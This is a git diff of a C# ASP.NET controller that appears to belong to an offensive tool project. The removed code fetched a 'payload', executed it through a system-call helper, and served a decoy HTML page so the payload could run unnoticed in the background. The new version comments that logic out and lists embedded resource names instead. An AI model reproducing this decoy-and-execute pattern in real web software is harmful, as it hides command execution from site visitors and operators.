@@ -1,13 +1,18 @@
 using System;
-using lamba.Interfaces;
+using System.Reflection;
 using System.Collections.Generic;
-using Microsoft.AspNetCore.Http.Extensions;
+using System.Diagnostics;
+using System.Linq;
+using System.Threading.Tasks;
 using Microsoft.AspNetCore.Mvc;
+using namba.Models;
+using namba.Interfaces;
+using UAParser;
 
-namespace lamba.Controllers
+namespace namba.Controllers
 {
-	[Route("lamba")]
-	public class LambaController : ControllerBase
+
+	public class LambaController : Controller
 	{
 		private readonly IHelper _helper;
 		
@@ -17,12 +22,12 @@ namespace lamba.Controllers
 		}
 		
 		// GET: lamba
-		
-		[HttpGet]
-		public string Get()
+		public ActionResult Index()
 		{
-		    Console.WriteLine(Request.GetDisplayUrl());
+		    /*
+			Console.WriteLine(Request.GetDisplayUrl());
 		    Console.WriteLine(Request.GetEncodedUrl());
+			
 			string ret = _helper.getPayload();
 			int ret2 = 0;
 			
@@ -30,9 +35,14 @@ namespace lamba.Controllers
 			{
 				ret2 = _helper.callSystem(ret);
 			}
+			*/
 			
-            string decoy = "<h3>Decoy HTML will be displayed here while payload runs in the background!</h3><br>Payload: " + ret;
-			return decoy;
+			//var uaParser = Parser.GetDefault();
+			string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+			ViewData["resourceNames"] = resourceNames;
+			//var agt = Request.UserAgent;
+             
+			return View();
 		}
 	}
 }
